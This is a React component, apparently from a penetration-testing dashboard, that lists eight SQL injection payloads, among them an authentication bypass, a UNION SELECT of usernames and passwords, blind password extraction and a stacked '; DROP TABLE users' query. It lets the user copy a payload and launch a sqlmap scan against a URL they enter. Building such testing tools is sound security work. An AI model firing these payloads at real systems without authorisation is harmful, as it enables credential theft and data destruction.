import React, { useState } from 'react';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from '@/components/ui/use-toast';
import { Copy, Check, Bug } from 'lucide-react';
import { executeHackingTool } from '@/utils/osintUtilsConnector';

interface SqliPayloadsTabProps {
  isExecuting: boolean;
  setIsExecuting: (isExecuting: boolean) => void;
  setToolOutput: (output: string | null) => void;
  executeSelectedTool: (toolType: string) => Promise<void>;
  toolOutput: string | null;
  activeTab: string;
}

const SqliPayloadsTab: React.FC<SqliPayloadsTabProps> = ({ 
  isExecuting, 
  setIsExecuting, 
  setToolOutput,
  executeSelectedTool,
  toolOutput,
  activeTab
}) => {
  const [selectedSqliPayload, setSelectedSqliPayload] = useState('');
  const [sqliTarget, setSqliTarget] = useState('');
  const [copySuccess, setCopySuccess] = useState<string | null>(null);
  
  const sqliPayloads = {
    'basic-auth-bypass': `' OR 1=1 --`,
    'union-select': `' UNION SELECT username, password FROM users --`,
    'time-based': `' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --`,
    'error-based': `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --`,
    'blind': `' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --`,
    'stacked-queries': `'; DROP TABLE users --`,
    'postgresql': `' OR EXISTS(SELECT 1 FROM pg_tables) --`,
    'mysql': `' OR EXISTS(SELECT 1 FROM information_schema.tables) --`
  };
  
  const handleCopyToClipboard = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopySuccess(type);
      setTimeout(() => setCopySuccess(null), 2000);
      toast({
        title: "Copied to clipboard!",
        description: `The ${type} has been copied to your clipboard.`,
      });
    });
  };
  
  const executeSQLiTool = async () => {
    setIsExecuting(true);
    setToolOutput(null);
    
    try {
      // Execute SQLi scan using selected payload
      const payload = selectedSqliPayload ? sqliPayloads[selectedSqliPayload as keyof typeof sqliPayloads] : '';
      
      // Call the provided executeSelectedTool function
      await executeSelectedTool('sqlmap');
      
      toast({
        title: "SQLi Tool Executed",
        description: "Scan executed against target",
      });
    } catch (error) {
      console.error('Tool execution error:', error);
      setToolOutput(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      
      toast({
        title: "Execution Failed",
        description: error instanceof Error ? error.message : "An unknown error occurred",
        variant: "destructive"
      });
    } finally {
      setIsExecuting(false);
    }
  };

  return (
    <div className="space-y-4">
      <div>
        <Label htmlFor="sqli-type">SQLi Payload Type</Label>
        <Select 
          value={selectedSqliPayload} 
          onValueChange={setSelectedSqliPayload}
        >
          <SelectTrigger className="bg-scanner-dark-alt border-gray-700">
            <SelectValue placeholder="Select a SQLi payload" />
          </SelectTrigger>
          <SelectContent className="bg-scanner-dark border-gray-700">
            {Object.keys(sqliPayloads).map((key) => (
              <SelectItem key={key} value={key}>{key}</SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>
      
      {selectedSqliPayload && (
        <div className="mt-4">
          <Label>Generated SQLi Payload</Label>
          <div className="relative mt-1.5">
            <Textarea 
              readOnly 
              value={sqliPayloads[selectedSqliPayload as keyof typeof sqliPayloads]}
              className="min-h-24 font-mono text-sm bg-scanner-dark-alt border-gray-700"
            />
            <Button 
              size="sm" 
              variant="outline" 
              className="absolute right-2 top-2 h-8 border-gray-700 hover:bg-scanner-dark-alt"
              onClick={() => handleCopyToClipboard(
                sqliPayloads[selectedSqliPayload as keyof typeof sqliPayloads], 
                'SQLi payload'
              )}
            >
              {copySuccess === 'SQLi payload' ? (
                <Check className="h-4 w-4" />
              ) : (
                <Copy className="h-4 w-4" />
              )}
            </Button>
          </div>
          <p className="text-gray-400 text-xs mt-2">
            Use this payload to test for SQL Injection vulnerabilities
          </p>
          
          <div className="mt-4 space-y-4">
            <div>
              <Label htmlFor="sqli-target">Target URL</Label>
              <Input
                id="sqli-target"
                placeholder="https://example.com/login.php"
                value={sqliTarget}
                onChange={(e) => setSqliTarget(e.target.value)}
                className="bg-scanner-dark-alt border-gray-700"
              />
            </div>
            
            <Button
              onClick={executeSQLiTool}
              disabled={isExecuting || !sqliTarget}
              variant="default"
              className="bg-scanner-primary"
            >
              <Bug className="h-4 w-4 mr-2" />
              {isExecuting ? "Running..." : "Test SQLi"}
            </Button>
          </div>
          
          {toolOutput && activeTab === 'sqli' && (
            <div className="mt-4">
              <Label>Tool Output</Label>
              <div className="bg-scanner-dark-alt border border-gray-700 rounded-md p-4 mt-1.5">
                <pre className="text-xs overflow-auto whitespace-pre-wrap">{toolOutput}</pre>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default SqliPayloadsTab;
